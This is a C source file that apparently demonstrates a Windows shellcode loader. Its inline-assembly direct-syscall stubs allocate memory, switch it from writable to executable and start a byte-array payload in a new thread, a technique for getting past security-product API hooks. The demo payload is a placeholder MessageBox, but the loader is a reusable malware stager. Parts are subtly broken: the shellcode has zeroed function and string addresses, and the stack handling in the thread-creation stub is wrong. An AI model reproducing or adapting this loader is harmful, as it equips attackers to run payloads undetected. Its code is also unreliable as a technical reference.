#include <Windows.h>
#include <stdio.h>

// Windows 10 22H2 syscall numbers
#define SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY 0x18
#define SYSCALL_NT_PROTECT_VIRTUAL_MEMORY 0x50
#define SYSCALL_NT_CREATE_THREAD_EX 0xC2

// 1. DIRECT SYSCALL FOR MEMORY ALLOCATION (Your code)
NTSTATUS NtAllocateVirtualMemory_Direct(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    __asm__ volatile(
        "mov r10, rcx\n"
        "mov eax, 0x18\n"
        "syscall\n"
        "ret\n"
    );
}

// 2. DIRECT SYSCALL FOR MEMORY PROTECTION - FIXED
NTSTATUS NtProtectVirtualMemory_Direct(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect)
{
    __asm__ volatile(
        "mov r10, rcx\n"
        "mov eax, 0x50\n"
        "syscall\n"
        "ret\n"
    );
}

// 3. DIRECT SYSCALL FOR THREAD CREATION - FIXED with shadow space!
NTSTATUS NtCreateThreadEx_Direct(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList)
{
    __asm__ volatile(
        "mov r10, rcx\n"
        "mov eax, 0xC2\n"
        "sub rsp, 28h\n"        // ← SHADOW SPACE (CRITICAL!)
        "syscall\n"
        "add rsp, 28h\n"        // ← RESTORE STACK
        "ret\n"
    );
}

// 🔴 ACTUAL SHELLCODE - MESSAGEBOX EXAMPLE
unsigned char shellcode[] = {
    // x64 MessageBox shellcode
    0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 0x28
    0x48, 0x31, 0xC9,                                           // xor rcx, rcx (NULL hWnd)
    0x48, 0x31, 0xD2,                                           // xor rdx, rdx (NULL text - will fix)
    0x4D, 0x31, 0xC0,                                           // xor r8, r8 (NULL caption - will fix)
    0x49, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,                   // mov r9, 0 (MB_OK)
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, MessageBoxA address
    0xFF, 0xD0,                                                 // call rax
    0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 0x28
    0xC3                                                        // ret
};

int main()
{
    printf("[*] Direct Syscall + Shellcode Demo\n\n");

    // STEP 1: Allocate memory for shellcode (RWX) - YOUR CODE
    PVOID shellcodeAddr = NULL;
    SIZE_T size = sizeof(shellcode);

    printf("[1] Allocating memory via direct syscall...\n");
    NtAllocateVirtualMemory_Direct(
        GetCurrentProcess(),
        &shellcodeAddr,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE // First make it WRITABLE (not executable yet)
    );

    printf("    Memory allocated at: %p\n", shellcodeAddr);

    // STEP 2: COPY SHELLCODE TO ALLOCATED MEMORY
    printf("[2] Copying shellcode to allocated memory...\n");
    memcpy(shellcodeAddr, shellcode, sizeof(shellcode));
    printf("    Shellcode copied (%zu bytes)\n", sizeof(shellcode));

    // STEP 3: CHANGE MEMORY TO EXECUTABLE
    printf("[3] Changing memory protection to EXECUTE...\n");
    ULONG oldProtect;
    NtProtectVirtualMemory_Direct(
        GetCurrentProcess(),
        &shellcodeAddr,
        &size,
        PAGE_EXECUTE_READ, // Now make it EXECUTABLE
        &oldProtect);

    // STEP 4: EXECUTE SHELLCODE VIA DIRECT SYSCALL
    printf("[4] Creating thread to execute shellcode...\n");
    HANDLE hThread = NULL;
    NtCreateThreadEx_Direct(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        shellcodeAddr, // 🎯 SHELLCODE ADDRESS = START ROUTINE!
        NULL,
        0,
        0,
        0,
        0,
        NULL);

    printf("[5] Shellcode executing! Check for MessageBox...\n");
    WaitForSingleObject(hThread, INFINITE);

    // CLEANUP
    VirtualFree(shellcodeAddr, 0, MEM_RELEASE);
    CloseHandle(hThread);

    return 0;
}